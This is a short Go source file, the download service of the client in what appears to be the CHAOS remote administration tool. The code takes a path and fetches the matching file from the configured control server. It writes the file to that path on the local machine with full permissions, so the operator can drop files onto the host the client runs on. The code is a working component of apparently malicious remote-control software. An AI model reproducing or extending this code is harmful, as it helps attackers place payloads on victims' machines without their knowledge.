package download

import (
	"fmt"
	"github.com/tiagorlampert/CHAOS/client/app/environment"
	"github.com/tiagorlampert/CHAOS/client/app/gateways"
	"github.com/tiagorlampert/CHAOS/client/app/services"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
)

type Service struct {
	Configuration *environment.Configuration
	Gateway       gateways.Gateway
}

func NewService(configuration *environment.Configuration, gateway gateways.Gateway) services.Download {
	return &Service{
		Configuration: configuration,
		Gateway:       gateway,
	}
}

func (d Service) DownloadFile(filepath string) ([]byte, error) {
	filename := getFilenameFromPath(filepath)
	url := fmt.Sprintf("%s/%s", fmt.Sprint(d.Configuration.Server.Url, "download"), filename)

	res, err := d.Gateway.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return nil, err
	}
	if res.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("request failed with status code: %d", res.StatusCode)
	}

	if err := ioutil.WriteFile(filepath, res.ResponseBody, os.ModePerm); err != nil {
		return nil, err
	}
	return []byte(filename), nil
}

func getFilenameFromPath(path string) string {
	return filepath.Base(path)
}
